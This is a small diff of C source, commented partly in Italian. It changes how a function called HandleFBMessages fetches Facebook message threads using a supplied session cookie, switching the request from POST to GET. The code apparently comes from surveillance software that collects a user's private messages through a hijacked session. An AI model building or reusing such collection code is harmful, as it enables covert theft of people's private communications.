@@ -324,7 +324,8 @@ DWORD HandleFBMessages(char *cookie)
 		SetLastFBTstamp(user, act_tstamp, 0);
 
 		// Pe ogni thread chiede tutti i rispettivi messaggi
-		ret_val = HttpSocialRequest(L"www.facebook.com", L"POST", url, 443, (BYTE *)post_data, strlen(post_data), &r_buffer_inner, &dummy, cookie);
+		//ret_val = HttpSocialRequest(L"www.facebook.com", L"POST", url, 443, (BYTE *)post_data, strlen(post_data), &r_buffer_inner, &dummy, cookie);
+		ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", url, 443, NULL, 0, &r_buffer_inner, &dummy, cookie);
 		if (ret_val != SOCIAL_REQUEST_SUCCESS) {
 			SAFE_FREE(r_buffer);
 			return ret_val;
